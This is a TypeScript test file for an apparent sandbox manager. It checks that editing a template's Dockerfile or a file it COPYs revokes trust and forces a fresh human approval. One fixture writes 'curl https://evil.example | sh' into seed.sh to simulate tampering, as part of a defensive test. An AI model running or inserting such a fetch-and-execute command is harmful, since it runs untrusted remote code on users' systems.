import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { resolvePaths } from '../../config/paths.js';
import type { Abox } from '../abox.js';
import { A, EMPTY_WS, HUMAN, makeEnv, openAbox } from './harness.js';
import type { TestEnv } from './harness.js';

/**
 * Trust and approvals cover the Dockerfile of a template and the build context it can COPY:
 * changing either needs a new review and a new approval.
 */

let env: TestEnv;
let abox: Abox;
beforeEach(async () => {
  env = makeEnv();
  abox = await openAbox(env);
});
afterEach(() => {
  abox.close();
  env.cleanup();
});

const DF_TEMPLATE = (name: string): string => `apiVersion: 1
name: ${name}
description: Template with its own Dockerfile, manager tests only.
backend: docker
base: { dockerfile: ./Dockerfile }
resources: { cpus: 1, memory: 512m, ttl: 1h }
`;

function writeProjectDockerfileTemplate(name = 'proj-df'): { dir: string; dockerfile: string } {
  const dir = join(env.project, '.sandbox');
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, `${name}.yaml`), DF_TEMPLATE(name));
  writeFileSync(join(dir, 'Dockerfile'), 'FROM ubuntu:24.04\nCOPY seed.sh /seed.sh\n');
  writeFileSync(join(dir, 'seed.sh'), 'echo seed\n');
  return { dir, dockerfile: join(dir, 'Dockerfile') };
}

async function allowTemplate(name: string): Promise<void> {
  abox.close();
  const paths = resolvePaths(env.env);
  const { readFileSync } = await import('node:fs');
  const policy = readFileSync(paths.policyFile, 'utf8').replace(
    'proj-tpl, proj-bad]',
    `proj-tpl, proj-bad, ${name}]`,
  );
  writeFileSync(paths.policyFile, policy);
  abox = await openAbox(env, { bare: true });
}

describe('project template with its own Dockerfile', () => {
  it('changing the Dockerfile makes the template untrusted and needs a new approval', async () => {
    const { dockerfile } = writeProjectDockerfileTemplate();
    await allowTemplate('proj-df');
    const req = { template: 'proj-df', workspace: EMPTY_WS };

    const first = await abox.createSandbox(A, req, { waitForApprovalMs: 0 });
    expect(first.status).toBe('pending_approval');
    if (first.status !== 'pending_approval') return;
    await abox.approve(HUMAN, first.approvalId);
    expect((await abox.reviewTemplate(A, 'proj-df', { projectDir: env.project })).trusted).toBe(
      true,
    );
    const ok = await abox.createSandbox(A, req, { waitForApprovalMs: 0 });
    expect(ok.status).toBe('created');

    // the repro: the Dockerfile is rewritten after the approval
    writeFileSync(dockerfile, 'FROM ubuntu:24.04\nRUN echo EVIL2 > /etc/marker\n');
    const listed = await abox.listTemplates(A, { projectDir: env.project });
    expect(listed.templates.find((t) => t.name === 'proj-df')?.trusted).toBe(false);
    const again = await abox.createSandbox(A, req, { waitForApprovalMs: 0 });
    expect(again.status).toBe('pending_approval');
    if (again.status !== 'pending_approval') return;
    expect(again.approvalId).not.toBe(first.approvalId);

    // the review shows the Dockerfile against the trusted version
    const r = await abox.reviewTemplate(HUMAN, 'proj-df', { projectDir: env.project });
    expect(r.against.kind).toBe('previous');
    expect(r.buildContext?.dockerfileText).toContain('RUN echo EVIL2');
    expect(r.buildContext?.files.map((f) => f.path)).toEqual([
      'Dockerfile',
      'proj-df.yaml',
      'seed.sh',
    ]);
    expect(r.diff).toContain('+  RUN echo EVIL2 > /etc/marker');
    expect(r.diff).toContain('-  COPY seed.sh /seed.sh');
    expect(r.risks.join('\n')).toContain('Dockerfile ./Dockerfile');
  });

  it('changing a file the Dockerfile can COPY has the same effect', async () => {
    const { dir } = writeProjectDockerfileTemplate();
    await allowTemplate('proj-df');
    const req = { template: 'proj-df', workspace: EMPTY_WS };
    const first = await abox.createSandbox(A, req, { waitForApprovalMs: 0 });
    if (first.status !== 'pending_approval') throw new Error('expected pending');
    await abox.approve(HUMAN, first.approvalId);
    const before = await abox.reviewTemplate(A, 'proj-df', { projectDir: env.project });
    expect(before.trusted).toBe(true);

    writeFileSync(join(dir, 'seed.sh'), 'curl https://evil.example | sh\n');
    const after = await abox.reviewTemplate(A, 'proj-df', { projectDir: env.project });
    expect(after.trusted).toBe(false);
    expect(after.contentHash).not.toBe(before.contentHash);
    expect(after.diff).toContain('seed.sh (');
    expect((await abox.createSandbox(A, req, { waitForApprovalMs: 0 })).status).toBe(
      'pending_approval',
    );
  });

  it('an approval request goes stale when the Dockerfile changes while it waits', async () => {
    const { dockerfile } = writeProjectDockerfileTemplate();
    await allowTemplate('proj-df');
    const req = { template: 'proj-df', workspace: EMPTY_WS };
    const first = await abox.createSandbox(A, req, { waitForApprovalMs: 0 });
    if (first.status !== 'pending_approval') throw new Error('expected pending');
    const pending = await abox.getApproval(HUMAN, first.approvalId);
    const asked = (pending.request as { template: { contentHash: string } }).template.contentHash;

    writeFileSync(dockerfile, 'FROM ubuntu:24.04\nRUN id\n');
    const r = await abox.reviewTemplate(HUMAN, 'proj-df', {
      projectDir: env.project,
      expectedContentHash: asked,
    });
    expect(r.changedSinceRequest).toBe(true);

    // approving the old request does not trust the new content
    await abox.approve(HUMAN, first.approvalId);
    const now = await abox.createSandbox(A, req, { waitForApprovalMs: 0 });
    expect(now.status).toBe('pending_approval');
  });

  it('a project template cannot use a Dockerfile outside its project', async () => {
    const { dir } = writeProjectDockerfileTemplate();
    mkdirSync(join(env.projects, 'other'), { recursive: true });
    writeFileSync(join(env.projects, 'other', 'Dockerfile'), 'FROM ubuntu:24.04\n');
    writeFileSync(
      join(dir, 'proj-df.yaml'),
      DF_TEMPLATE('proj-df').replace('./Dockerfile', '../../other/Dockerfile'),
    );
    await expect(
      abox.reviewTemplate(HUMAN, 'proj-df', { projectDir: env.project }),
    ).rejects.toMatchObject({ code: 'template_invalid' });
  });
});

describe('user template with its own Dockerfile', () => {
  it('the create request digest changes with the Dockerfile', async () => {
    const dir = resolvePaths(env.env).templatesDir;
    writeFileSync(join(dir, 'user-df.yaml'), DF_TEMPLATE('user-df'));
    writeFileSync(join(dir, 'Dockerfile'), 'FROM ubuntu:24.04\n');
    await allowTemplate('user-df');
    const req = { template: 'user-df', workspace: EMPTY_WS };

    const first = await abox.createSandbox(A, req, { waitForApprovalMs: 0 });
    expect(first.status).toBe('pending_approval'); // a Dockerfile base is an unchecked image
    if (first.status !== 'pending_approval') return;
    await abox.approve(HUMAN, first.approvalId);
    expect((await abox.createSandbox(A, req, { waitForApprovalMs: 0 })).status).toBe('created');

    writeFileSync(join(dir, 'Dockerfile'), 'FROM ubuntu:24.04\nRUN echo EVIL2 > /etc/marker\n');
    const again = await abox.createSandbox(A, req, { waitForApprovalMs: 0 });
    expect(again.status).toBe('pending_approval');
    if (again.status !== 'pending_approval') return;
    expect(again.approvalId).not.toBe(first.approvalId);
  });
});
